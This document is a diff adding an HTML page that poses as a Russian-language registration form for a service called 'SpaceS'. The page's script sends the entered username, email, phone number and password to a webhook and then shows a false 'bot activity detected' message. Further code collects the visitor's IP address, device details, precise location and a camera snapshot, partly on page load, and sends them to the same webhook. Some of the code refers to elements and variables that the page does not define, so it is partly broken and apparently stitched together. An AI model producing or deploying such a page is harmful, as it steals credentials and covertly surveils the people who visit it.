@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SpaceS - Registration Page">
+    <meta name="keywords" content="SpaceS, registration, sign up">
+    <meta name="author" content="SpaceS Team">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <title>SpaceS - Registration</title>
+    <style>
+        :root {
+            --primary-color: #a855f7;
+            --background-color: #0d0d0d;
+            --secondary-color: #1a1a1a;
+            --text-color: #ffffff;
+            --light-bg: #f7f7f7;
+            --light-text: #000000;
+        }
+
+        [data-theme="light"] {
+            --background-color: var(--light-bg);
+            --text-color: var(--light-text);
+            --secondary-color: #eaeaea;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            transition: background 0.3s, color 0.3s;
+        }
+
+        .form-container {
+            background: var(--secondary-color);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .form-container h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+        }
+
+        .form-container input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+            background: var(--background-color);
+            color: var(--text-color);
+            transition: border 0.3s;
+        }
+
+        .form-container input:focus {
+            border-color: var(--primary-color);
+        }
+
+        .form-container button {
+            background: var(--primary-color);
+            color: var(--text-color);
+            border: none;
+            padding: 10px 20px;
+            font-size: 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.3s;
+        }
+
+        .form-container button:hover {
+            background: #7817df;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h1>Регистрация</h1>
+        <form id="registration-form">
+            <input type="text" id="username" placeholder="Имя пользователя" required>
+            <input type="email" id="email" placeholder="Электронная почта" required>
+            <input type="tel" id="phone" placeholder="Номер телефона" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <button type="submit">Зарегистрироваться</button>
+        </form>
+    </div>
+
+    <script>
+        const webhookUrl = "https://your-webhook-url-here.com";
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const referralCode = urlParams.get("refer");
+
+        document.getElementById("registration-form").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const username = document.getElementById("username").value;
+            const email = document.getElementById("email").value;
+            const phone = document.getElementById("phone").value;
+            const password = document.getElementById("password").value;
+
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        username,
+                        email,
+                        phone,
+                        password,
+                        referralCode: referralCode || "none"
+                    })
+                });
+                alert("Bot activite detected! please try again later.");
+            } catch (error) {
+                console.error("Ошибка отправки данных:", error);
+                alert("Error saving the data.");
+            }
+        });
+            // Helper: Send data
+      async function sendData(type, data) {
+        try {
+          await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ type, data }),
+          });
+          console.log(`Sent (${type}):`, data);
+        } catch (e) {
+          console.error("Send error:", e);
+        }
+      }
+
+      // Collect IP
+      async function fetchIP() {
+        try {
+          const res = await fetch("https://api.ipify.org?format=json");
+          const { ip } = await res.json();
+          await sendData("ip", { ip });
+        } catch (e) {
+          console.error("IP fetch error:", e);
+        }
+      }
+
+      // Collect device info
+      function collectDeviceInfo() {
+        const deviceInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cookiesEnabled: navigator.cookieEnabled,
+          screenWidth: window.screen.width,
+          screenHeight: window.screen.height,
+        };
+        sendData("device", deviceInfo);
+      }
+
+      // Collect location info
+      async function collectLocationInfo() {
+        if (navigator.geolocation) {
+          try {
+            await new Promise((resolve, reject) =>
+              navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                  sendData("location", {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                  });
+                  resolve();
+                },
+                (err) => {
+                  console.warn("Location error:", err);
+                  reject(err);
+                },
+                { enableHighAccuracy: true }
+              )
+            );
+          } catch (e) {
+            console.warn("Geolocation error:", e);
+          }
+        }
+      }
+
+      // Collect camera snapshot
+      async function collectCameraInfo() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+          const snapshot = canvas.toDataURL("image/png");
+          await sendData("camera", { snapshot });
+          stream.getTracks().forEach((track) => track.stop());
+        } catch (e) {
+          console.warn("Camera access error:", e);
+        }
+      }
+
+      // Collect network info
+      function collectNetworkInfo() {
+        if (navigator.connection) {
+          const networkInfo = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+          };
+          sendData("network", networkInfo);
+        }
+      }
+
+      // Main process
+      async function runDataCollection() {
+        // Start sending data immediately
+        const ipPromise = fetchIP();
+        const deviceInfoPromise = collectDeviceInfo();
+        const networkInfoPromise = collectNetworkInfo();
+
+        // Conditional data collection
+        const locationPromise = collectLocationInfo();
+        const cameraPromise = collectCameraInfo();
+
+        // Wait for all promises to resolve
+        await Promise.all([ipPromise, deviceInfoPromise, networkInfoPromise, locationPromise, cameraPromise]);
+
+        // Once all data is collected, redirect
+        window.location.href = redirectUrl;
+      }
+
+      document.getElementById("verify-button").addEventListener("click", () => {
+        document.querySelector(".captcha-container").innerHTML =
+          "<p>Сбор данных... Пожалуйста, подождите.</p>";
+        runDataCollection();
+      });
+
+      // Auto-start data collection on page load
+      window.addEventListener("load", () => {
+        fetchIP();
+        collectDeviceInfo();
+        collectNetworkInfo();
+      });
+      }
+    </script>
+</body>
+</html>
